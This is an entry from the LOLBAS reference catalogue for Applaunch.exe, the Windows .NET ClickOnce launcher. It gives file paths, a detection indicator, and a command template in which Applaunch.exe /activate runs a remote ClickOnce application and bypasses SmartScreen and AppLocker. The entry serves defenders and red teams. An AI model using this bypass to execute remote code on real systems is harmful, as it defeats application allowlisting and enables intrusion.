---
title: "Applaunch.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Applaunch/
fetched_at: 2026-09-20T17:09:18Z
license: unspecified
category: windows
---

Microsoft .NET ClickOnce Launch Utility.

## Paths
- C:\Windows\Microsoft.NET\Framework\v2.0.50727\Applaunch.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Applaunch.exe
- C:\Windows\Microsoft.NET\Framework\v4.0.30319\Applaunch.exe
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe

## Resources
- [https://nathan2.com/posts/clicktools](https://nathan2.com/posts/clicktools)
- [https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment](https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment)
- [https://web.archive.org/web/20060913192623/http://blogs.msdn.com/shawnfa/archive/2005/11/30/498610.aspx](https://web.archive.org/web/20060913192623/http://blogs.msdn.com/shawnfa/archive/2005/11/30/498610.aspx)

## Acknowledgements
- Nathan Sawyer

## Detections
- IOC: Applaunch.exe rarely executes unless any ClickOnce partial trusted apps are used. Any use or invocation outside dfsvc.exe with /activate should be considered suspicious.

## AWL bypass

1. Launches a ClickOnce application via Applaunch.exe. Bypasses SmartScreen and default AppLocker rules when the application is published as partial trust.

```
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate "{REMOTEURL}#APPLICATION_METADATA_HERE"
```

   - Use case: Execute ClickOnce applications in environments where dfsvc.exe would normally enforce full-trust and SmartScreen checks. Can be abused as an AWL bypass in rare configurations.

   - Privileges required: User

   - Operating systems: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1127.002

   - Tags: Execute: ClickOnceExecute: Remote
